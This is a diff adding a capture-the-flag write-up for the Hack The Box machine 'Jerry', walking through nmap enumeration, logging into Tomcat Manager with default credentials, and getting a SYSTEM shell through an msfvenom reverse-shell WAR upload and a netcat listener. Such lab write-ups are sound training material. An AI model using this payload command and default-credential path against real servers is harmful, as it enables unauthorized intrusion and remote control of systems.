@@ -1,1 +1,170 @@
 
+# HTB – Jerry Writeup
+
+**Target:** Jerry  
+**Difficulty:** Easy  
+**OS:** Windows Server 2012 R2  
+**Service:** Apache Tomcat 7.0.88  
+**Goal:** Obtain SYSTEM access and retrieve flags  
+
+---
+
+## 1. Initial Enumeration
+
+Performed a full port and service scan:
+
+```bash
+nmap -sC -sV -p- <TARGET_IP>
+```
+
+### Open Ports Identified:
+
+| Port | Service | Version |
+|------|---------|----------|
+| 8080 | HTTP | Apache Tomcat 7.0.88 |
+
+The service header showed:
+
+```
+Apache-Coyote/1.1
+Apache Tomcat/7.0.88
+```
+
+This indicated a Tomcat web server running on port 8080.
+
+---
+
+## 2. Web Enumeration
+
+Accessing:
+
+```
+http://<TARGET_IP>:8080
+```
+
+Revealed the default Apache Tomcat page.
+
+Navigating to:
+
+```
+/manager/html
+```
+
+Prompted for credentials.
+
+After testing common/default credentials, the following worked:
+
+```
+Username: tomcat
+Password: s3cret
+```
+
+Login was successful.
+
+---
+
+## 3. WAR File Upload (Initial Access)
+
+Inside the Tomcat Manager panel, there was an option to upload a WAR file.
+
+### Generate a reverse shell WAR file:
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f war > reverse.war
+```
+
+Start a listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Upload `reverse.war` through the Tomcat Manager interface.
+
+Once deployed, access:
+
+```
+http://<TARGET_IP>:8080/reverse/
+```
+
+This triggered the reverse shell.
+
+---
+
+## 4. Verify Privileges
+
+After obtaining the shell:
+
+```cmd
+whoami
+```
+
+Output:
+
+```
+nt authority\system
+```
+
+This means the Tomcat service was running as SYSTEM.
+
+No privilege escalation was required.
+
+---
+
+## 5. Retrieve Flags
+
+Navigate to:
+
+```cmd
+cd C:\Users\Administrator\Desktop
+dir
+```
+
+A folder named `flags` was present:
+
+```cmd
+cd flags
+dir
+```
+
+File found:
+
+```
+2 for the price of 1.txt
+```
+
+Read the file:
+
+```cmd
+type "2 for the price of 1.txt"
+```
+
+This file contains both user and root flags.
+
+---
+
+## Conclusion
+
+The machine was vulnerable due to:
+
+- Default Tomcat credentials
+- WAR file upload capability
+- Tomcat service running as SYSTEM
+
+Exploitation path:
+
+1. Identify Tomcat service
+2. Access manager panel
+3. Use default credentials
+4. Upload malicious WAR file
+5. Obtain SYSTEM shell
+
+Key takeaway:
+
+Always check for:
+- Default credentials
+- Web management panels
+- Upload functionality
+- Service privilege level
+
+This machine required exploitation only. No privilege escalation was necessary.
